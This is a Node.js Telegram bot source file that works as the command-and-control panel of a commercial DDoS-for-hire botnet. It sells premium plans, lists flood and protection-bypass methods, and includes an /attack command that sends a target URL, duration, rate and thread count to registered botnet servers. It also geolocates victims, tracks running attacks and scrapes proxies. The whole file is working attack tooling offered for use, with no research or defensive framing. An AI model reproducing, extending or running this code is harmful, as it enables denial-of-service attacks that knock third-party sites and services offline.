const { Telegraf, Markup } = require('telegraf');
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const config = require('./config');
const concurrentConfig = require('./database/concurrent');

const bot = new Telegraf(config.BOT_TOKEN);
const userPlans = JSON.parse(fs.readFileSync('./database/plans.json', 'utf-8'));
const botnetServers = JSON.parse(fs.readFileSync('./database/botnet.json', 'utf-8'));

// Global attack state
const activeAttacks = new Map();

// Fungsi get Uptime
function getUptime() {
  const uptime = process.uptime();
  const days = Math.floor(uptime / 86400);
  const hours = Math.floor((uptime % 86400) / 3600);
  const minutes = Math.floor((uptime % 3600) / 60);
  return `${days}d ${hours}h ${minutes}m`;
}

// Cek user premium
function isPremium(userId) {
  return userPlans.some(p => p.id_telegram === userId.toString());
}

// Get user plan
function getUserPlan(userId) {
  return userPlans.find(p => p.id_telegram === userId.toString());
}

// Format waktu
function formatTime(seconds) {
  const d = Math.floor(seconds / 86400);
  const h = Math.floor((seconds % 86400) / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = Math.floor(seconds % 60);
  return `${d}d ${h}h ${m}m ${s}s`;
}

// Get IP Info
async function getIpInfo(target) {
  try {
    const url = new URL(target);
    const hostname = url.hostname;
    const response = await axios.get(`http://ip-api.com/json/${hostname}`);
    if (response.data.status === 'success') {
      return {
        ip: response.data.query,
        isp: response.data.isp || 'Unknown',
        as: response.data.as || 'Unknown',
        country: response.data.country || 'Unknown',
        region: response.data.regionName || 'Unknown',
        city: response.data.city || 'Unknown'
      };
    }
  } catch (e) {
    return {
      ip: 'Unknown',
      isp: 'Unknown',
      as: 'Unknown',
      country: 'Unknown',
      region: 'Unknown',
      city: 'Unknown'
    };
  }
  return {
    ip: 'Unknown',
    isp: 'Unknown',
    as: 'Unknown',
    country: 'Unknown',
    region: 'Unknown',
    city: 'Unknown'
  };
}

// ✅ FIX: Function get API endpoint dari botnet.json
function getApiEndpoint() {
  if (botnetServers.length === 0) {
    return null;
  }
  // Ambil server pertama sebagai default, atau bisa round-robin
  return botnetServers[0];
}

// ✅ FIX: Function get random API endpoint (load balancing)
function getRandomApiEndpoint() {
  if (botnetServers.length === 0) {
    return null;
  }
  const randomIndex = Math.floor(Math.random() * botnetServers.length);
  return botnetServers[randomIndex];
}

// START COMMAND
bot.start(async (ctx) => {
  const userId = ctx.from.id.toString();
  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
  const waktuRunPanel = getUptime();
  const premium = isPremium(userId);

  const richMessage = `
<video src="https://files.catbox.moe/tor7h1.mp4"></video>

<blockquote>
( 💀 ) C2 - DDoS BOTNET —❍—
</blockquote>

<pre>• User : ${Name}</pre>
<pre>• Status : 🟢 Online</pre>
<pre>• Uptime : ${waktuRunPanel}</pre>
<pre>• Premium : ${premium ? '✅ Active' : '❌ Not Active'}</pre>
<pre>• Servers : ${botnetServers.length}</pre>

<hr/>

<details open>
<summary><b>📌 NAVIGATION MENU</b></summary>

<table bordered>
<tr><th>Menu</th><th>Description</th></tr>
<tr><td>📑 Methods Menu</td><td>DDoS Attack Methods</td></tr>
<tr><td>🔥 Server Management</td><td>Botnet Server Control</td></tr>
<tr><td>👑 Owner Menu</td><td>Administration Panel</td></tr>
</table>
</details>

<hr/>

<footer>
<b>C2 - DDoS BOTNET 🕊️</b>
</footer>
  `;

  try {
    await ctx.telegram.callApi("sendRichMessage", {
      chat_id: ctx.chat.id,
      rich_message: { markdown: richMessage },
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "📑 Methods Menu",
              callback_data: "methods_menu",
              style: "danger"
            },
            {
              text: "🔥 Server Management",
              callback_data: "server_menu",
              style: "primary"
            }
          ],
          [
            {
              text: "👑 Owner Menu",
              callback_data: "owner_menu",
              style: "success"
            }
          ]
        ]
      }
    });
  } catch (err) {
    console.error("[MENU ERROR]:", err.message);
    await ctx.reply("❌ Error loading menu. Type /start again.");
  }
});

// METHODS MENU
bot.action('methods_menu', async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isPremium(userId)) {
    return ctx.answerCbQuery('❌ You are not premium!', true);
  }

  const richMessage = `
<details open>
<summary><b>📑 METHODS EXECUTOR</b></summary>

<table bordered striped>
<tr><th>🚀 Methods</th><th>📌 Fungsi</th></tr>
<tr><td><code>H1PRIV</code></td><td>HTTP/1.1 Private Attack</td></tr>
<tr><td><code>H2PRIV</code></td><td>HTTP/2 Private Attack</td></tr>
<tr><td><code>CDNPRIV</code></td><td>CDN Bypass Attack</td></tr>
<tr><td><code>CFPRIV</code></td><td>CloudFlare Bypass Attack</td></tr>
<tr><td><code>BROWSERX</code></td><td>Browser Private Attack</td></tr>
<tr><td><code>RAW</code></td><td>Raw Socket Attack</td></tr>
<tr><td><code>CAPTCHA</code></td><td>Captcha Bypass Attack</td></tr>
<tr><td><code>UAM</code></td><td>Uam Bypass Attack</td></tr>
<tr><td><code>H2X</code></td><td>HTTP/2 Extreme Attack</td></tr>
<tr><td><code>TCPRIV</code></td><td>TCP Flood Private</td></tr>
<tr><td><code>TCP-XVL</code></td><td>TCP Extreme via Proxy</td></tr>
<tr><td><code>UDP-XVL</code></td><td>UDP Extreme via Proxy</td></tr>
</table>

<summary><b>⚔️ ATTACK EXECUTOR</b></summary>

<table bordered striped>
<tr><th>Command</th><th>Format</th></tr>
<tr><td><code>/attack</code></td><td>url duration methods</td></tr>
</table>
</details>

<footer>
<b>📌 Use: /attack http://target.com 60 h1priv</b>
</footer>
  `;

  await ctx.telegram.callApi("sendRichMessage", {
    chat_id: ctx.chat.id,
    rich_message: { markdown: richMessage },
    reply_markup: {
      inline_keyboard: [
        [{ text: "🔙 Back to Menu", callback_data: "back_menu" }]
      ]
    }
  });
  await ctx.answerCbQuery();
});

// SERVER MANAGEMENT
bot.action('server_menu', async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isPremium(userId)) {
    return ctx.answerCbQuery('❌ You are not premium!', true);
  }

  const richMessage = `
<details open>
<summary><b>🔥 SERVER MANAGEMENT</b></summary>

<table bordered striped>
<tr><th>Command</th><th>Fungsi</th></tr>
<tr><td><code>/addsrv</code></td><td>Add Botnet Server</td></tr>
<tr><td><code>/delsrv</code></td><td>Delete Botnet Server</td></tr>
<tr><td><code>/listsrv</code></td><td>List Botnet Servers</td></tr>
<tr><td><code>/status</code></td><td>List Status Attack</td></tr>
<tr><td><code>/stop</code></td><td>Stop Attack</td></tr>
<tr><td><code>/scrape</code></td><td>Scrape Proxy DDoS</td></tr>
</table>
</details>

<footer>
<b>📌 Server: ${botnetServers.length} connected</b>
</footer>
  `;

  await ctx.telegram.callApi("sendRichMessage", {
    chat_id: ctx.chat.id,
    rich_message: { markdown: richMessage },
    reply_markup: {
      inline_keyboard: [
        [{ text: "🔙 Back to Menu", callback_data: "back_menu" }]
      ]
    }
  });
  await ctx.answerCbQuery();
});

// OWNER MENU
bot.action('owner_menu', async (ctx) => {
  const userId = ctx.from.id.toString();
  if (userId !== config.OWNER_ID) {
    return ctx.answerCbQuery('❌ Owner only!', true);
  }

  const richMessage = `
<details open>
<summary><b>👑 OWNER MENU</b></summary>

<table bordered striped>
<tr><th>Command</th><th>Fungsi</th></tr>
<tr><td><code>/addplans</code></td><td>Add User Plan</td></tr>
<tr><td><code>/delplans</code></td><td>Delete User Plan</td></tr>
<tr><td><code>/listplans</code></td><td>List All Users</td></tr>
</table>
</details>

<footer>
<b>Format: /addplans nama id_telegram concurrent days</b>
</footer>
  `;

  await ctx.telegram.callApi("sendRichMessage", {
    chat_id: ctx.chat.id,
    rich_message: { markdown: richMessage },
    reply_markup: {
      inline_keyboard: [
        [{ text: "🔙 Back to Menu", callback_data: "back_menu" }]
      ]
    }
  });
  await ctx.answerCbQuery();
});

bot.action('back_menu', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.scene.enter('start');
  await ctx.start();
});

// ✅ FIX: ATTACK COMMAND - API endpoint dari botnet.json
bot.command('attack', async (ctx) => {
  const userId = ctx.from.id.toString();
  const userPlan = getUserPlan(userId);
  
  if (!userPlan) {
    return ctx.reply('❌ You are not premium! Contact owner to buy plan.');
  }

  // ✅ Cek apakah ada server terdaftar
  if (botnetServers.length === 0) {
    return ctx.reply('❌ No botnet server registered! Use /addsrv to add server.');
  }

  const args = ctx.message.text.split(' ');
  if (args.length < 4) {
    return ctx.reply('❌ Format: /attack <url> <duration> <methods>\nExample: /attack http://target.com 60 h1priv');
  }

  const target = args[1];
  const duration = parseInt(args[2]);
  const methods = args[3].toLowerCase();

  // Validasi URL
  try {
    new URL(target);
  } catch (e) {
    return ctx.reply('❌ Invalid URL!');
  }

  if (duration < 10 || duration > 99999) {
    return ctx.reply('❌ Duration must be 10-99999 seconds');
  }

  const concurrent = userPlan.concurrent;
  const concurrencyConfig = concurrentConfig[concurrent] || { rate: 32, thread: 2 };

  // Simpan state attack
  const attackId = Date.now().toString();
  activeAttacks.set(attackId, {
    userId,
    target,
    duration,
    methods,
    concurrent,
    rate: concurrencyConfig.rate,
    thread: concurrencyConfig.thread,
    startTime: Date.now(),
    status: 'running',
    elapsed: 0
  });

  // ✅ FIX: Ambil API endpoint dari botnet.json
  const apiEndpoint = getRandomApiEndpoint();
  if (!apiEndpoint) {
    activeAttacks.delete(attackId);
    return ctx.reply('❌ No API endpoint available! Add server first.');
  }

  // Kirim ke API
  try {
    const apiUrl = `${apiEndpoint}?target=${encodeURIComponent(target)}&time=${duration}&methods=${methods}&rate=${concurrencyConfig.rate}&thread=${concurrencyConfig.thread}`;
    await axios.get(apiUrl, { timeout: 5000 });

    // Kirim rich message status
    const ipInfo = await getIpInfo(target);
    const attackData = activeAttacks.get(attackId);

    const statusMessage = await ctx.replyWithHTML(`
🔥 <b>ATTACK LAUNCHED</b> 🔥

<pre>
📍 Target    : ${target}
🌐 ISP       : ${ipInfo.isp}
🖥️ IP        : ${ipInfo.ip}
🏢 AS        : ${ipInfo.as}
🌍 Country   : ${ipInfo.country}
🗺️ Region    : ${ipInfo.region}
🏙️ City      : ${ipInfo.city}
⚡ Concurrent: ${attackData.concurrent}
⚙️ Rate      : ${attackData.rate}
🧵 Thread    : ${attackData.thread}
📌 Methods   : ${methods.toUpperCase()}
⏰ Start     : ${new Date().toLocaleString('id-ID')}
⏱️ Running   : 0/${duration}s
📊 Status    : 🟢 RUNNING
🔗 Server    : ${apiEndpoint}
</pre>

<button onclick="window.open('https://check-host.net/check-http?host=${encodeURIComponent(target)}')">🔍 CEK TARGET</button>
    `);

    // Update running time
    const interval = setInterval(async () => {
      const data = activeAttacks.get(attackId);
      if (!data || data.status === 'stopped') {
        clearInterval(interval);
        return;
      }
      
      const elapsed = Math.floor((Date.now() - data.startTime) / 1000);
      data.elapsed = elapsed;
      
      if (elapsed >= duration) {
        data.status = 'completed';
        clearInterval(interval);
        await ctx.reply(`✅ Attack completed on ${target}`);
        activeAttacks.delete(attackId);
        return;
      }

      // Update message every 10s
      if (elapsed % 10 === 0 || elapsed === duration) {
        try {
          await ctx.telegram.editMessageText(
            ctx.chat.id,
            statusMessage.message_id,
            null,
            `
🔥 <b>ATTACK RUNNING</b> 🔥

<pre>
📍 Target    : ${target}
🌐 ISP       : ${ipInfo.isp}
🖥️ IP        : ${ipInfo.ip}
🏢 AS        : ${ipInfo.as}
🌍 Country   : ${ipInfo.country}
🗺️ Region    : ${ipInfo.region}
🏙️ City      : ${ipInfo.city}
⚡ Concurrent: ${data.concurrent}
⚙️ Rate      : ${data.rate}
🧵 Thread    : ${data.thread}
📌 Methods   : ${methods.toUpperCase()}
⏰ Start     : ${new Date(data.startTime).toLocaleString('id-ID')}
⏱️ Running   : ${elapsed}/${duration}s
📊 Status    : 🟢 RUNNING
🔗 Server    : ${apiEndpoint}
</pre>

<button onclick="window.open('https://check-host.net/check-http?host=${encodeURIComponent(target)}')">🔍 CEK TARGET</button>
            `,
            { parse_mode: 'HTML' }
          );
        } catch (e) {
          // Ignore edit errors
        }
      }
    }, 1000);

    // Simpan interval untuk stop
    activeAttacks.set(attackId, {
      ...activeAttacks.get(attackId),
      interval,
      messageId: statusMessage.message_id
    });

  } catch (error) {
    activeAttacks.delete(attackId);
    await ctx.replyWithHTML(`
❌ <b>ATTACK FAILED</b>

<pre>
Target : ${target}
Error  : ${error.message}
Status : 🔴 FAILED
</pre>
    `);
  }
});

// STOP COMMAND
bot.command('stop', async (ctx) => {
  const userId = ctx.from.id.toString();
  let stopped = 0;
  
  for (const [id, data] of activeAttacks) {
    if (data.userId === userId) {
      data.status = 'stopped';
      if (data.interval) clearInterval(data.interval);
      activeAttacks.delete(id);
      stopped++;
    }
  }
  
  await ctx.reply(`✅ Stopped ${stopped} attack(s)`);
});

// STATUS COMMAND
bot.command('status', async (ctx) => {
  const userId = ctx.from.id.toString();
  const userAttacks = [];
  
  for (const [id, data] of activeAttacks) {
    if (data.userId === userId) {
      const elapsed = Math.floor((Date.now() - data.startTime) / 1000);
      userAttacks.push(`• ${data.target} | ${elapsed}/${data.duration}s | ${data.methods}`);
    }
  }
  
  if (userAttacks.length === 0) {
    return ctx.reply('📭 No active attacks');
  }
  
  await ctx.replyWithHTML(`🔥 <b>Active Attacks: ${userAttacks.length}</b>\n\n${userAttacks.join('\n')}`);
});

// ADD SERVER
bot.command('addsrv', async (ctx) => {
  const userId = ctx.from.id.toString();
  if (userId !== config.OWNER_ID) return ctx.reply('❌ Owner only!');
  
  const args = ctx.message.text.split(' ');
  if (args.length < 2) return ctx.reply('❌ Format: /addsrv <api_url>\nExample: /addsrv http://vps-ip:7070/repzapi');
  
  const server = args[1];
  // Validasi URL
  try {
    new URL(server);
  } catch (e) {
    return ctx.reply('❌ Invalid URL format!');
  }
  
  botnetServers.push(server);
  fs.writeFileSync('./database/botnet.json', JSON.stringify(botnetServers, null, 2));
  await ctx.reply(`✅ Server added: ${server}\n📊 Total servers: ${botnetServers.length}`);
});

// DELETE SERVER
bot.command('delsrv', async (ctx) => {
  const userId = ctx.from.id.toString();
  if (userId !== config.OWNER_ID) return ctx.reply('❌ Owner only!');
  
  const args = ctx.message.text.split(' ');
  if (args.length < 2) return ctx.reply('❌ Format: /delsrv <index>');
  
  const index = parseInt(args[1]);
  if (isNaN(index) || index < 0 || index >= botnetServers.length) {
    return ctx.reply(`❌ Invalid index! Available: 0-${botnetServers.length - 1}`);
  }
  
  const removed = botnetServers.splice(index, 1);
  fs.writeFileSync('./database/botnet.json', JSON.stringify(botnetServers, null, 2));
  await ctx.reply(`✅ Server removed: ${removed[0]}\n📊 Remaining servers: ${botnetServers.length}`);
});

// LIST SERVER
bot.command('listsrv', async (ctx) => {
  const userId = ctx.from.id.toString();
  if (userId !== config.OWNER_ID) return ctx.reply('❌ Owner only!');
  
  if (botnetServers.length === 0) return ctx.reply('📭 No servers registered');
  
  const list = botnetServers.map((s, i) => `${i}. ${s}`).join('\n');
  await ctx.replyWithHTML(`🔥 <b>Botnet Servers (${botnetServers.length}):</b>\n\n${list}`);
});

// SCRAPE PROXY
bot.command('scrape', async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isPremium(userId)) return ctx.reply('❌ Premium only!');
  
  // ✅ Cek server tersedia
  if (botnetServers.length === 0) {
    return ctx.reply('❌ No botnet server registered!');
  }
  
  await ctx.reply('🔄 Scraping proxies... This may take a moment.');
  
  try {
    const apiEndpoint = getRandomApiEndpoint();
    const response = await axios.get(`${apiEndpoint}/scrape`, { timeout: 30000 });
    await ctx.reply(`✅ Proxies scraped: ${response.data.count || 'done'}\n📊 Server: ${apiEndpoint}`);
  } catch (e) {
    await ctx.reply(`❌ Scrape failed: ${e.message}`);
  }
});

// ADD PLANS
bot.command('addplans', async (ctx) => {
  const userId = ctx.from.id.toString();
  if (userId !== config.OWNER_ID) return ctx.reply('❌ Owner only!');
  
  const args = ctx.message.text.split(' ');
  if (args.length < 5) {
    return ctx.reply('❌ Format: /addplans <nama> <id_telegram> <concurrent(1-10)> <days>\nExample: /addplans repz 123456789 10 9999');
  }
  
  const nama = args[1];
  const idTelegram = args[2];
  const concurrent = parseInt(args[3]);
  const days = parseInt(args[4]);
  
  if (concurrent < 1 || concurrent > 10) return ctx.reply('❌ Concurrent must be 1-10');
  if (days < 1) return ctx.reply('❌ Days must be > 0');
  
  // Check existing
  const existing = userPlans.find(p => p.id_telegram === idTelegram);
  if (existing) {
    existing.nama = nama;
    existing.concurrent = concurrent;
    existing.days = days;
    existing.expiry = Date.now() + (days * 86400000);
  } else {
    userPlans.push({
      nama,
      id_telegram: idTelegram,
      concurrent,
      days,
      expiry: Date.now() + (days * 86400000),
      created: Date.now()
    });
  }
  
  fs.writeFileSync('./database/plans.json', JSON.stringify(userPlans, null, 2));
  await ctx.reply(`✅ Plan added/updated for ${nama} (${idTelegram}) | Concurrent: ${concurrent} | Days: ${days}`);
});

// DELETE PLANS
bot.command('delplans', async (ctx) => {
  const userId = ctx.from.id.toString();
  if (userId !== config.OWNER_ID) return ctx.reply('❌ Owner only!');
  
  const args = ctx.message.text.split(' ');
  if (args.length < 2) return ctx.reply('❌ Format: /delplans <nama>');
  
  const nama = args[1];
  const index = userPlans.findIndex(p => p.nama === nama);
  if (index === -1) return ctx.reply(`❌ User ${nama} not found`);
  
  userPlans.splice(index, 1);
  fs.writeFileSync('./database/plans.json', JSON.stringify(userPlans, null, 2));
  await ctx.reply(`✅ User ${nama} deleted`);
});

// LIST PLANS
bot.command('listplans', async (ctx) => {
  const userId = ctx.from.id.toString();
  if (userId !== config.OWNER_ID) return ctx.reply('❌ Owner only!');
  
  if (userPlans.length === 0) return ctx.reply('📭 No plans registered');
  
  const list = userPlans.map(p => {
    const expiry = new Date(p.expiry).toLocaleString('id-ID');
    const active = p.expiry > Date.now() ? '🟢 Active' : '🔴 Expired';
    return `• ${p.nama} | ID: ${p.id_telegram} | Concurrent: ${p.concurrent} | ${active} | Exp: ${expiry}`;
  }).join('\n');
  
  await ctx.replyWithHTML(`🔥 <b>User Plans (${userPlans.length}):</b>\n\n${list}`);
});

// Handle errors
bot.catch((err, ctx) => {
  console.error('Bot error:', err);
});

// Launch
bot.launch()
  .then(() => console.log('🔥 ZANGXX C2 Bot Running!'))
  .catch(err => console.error('Launch error:', err));

// Enable graceful stop
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));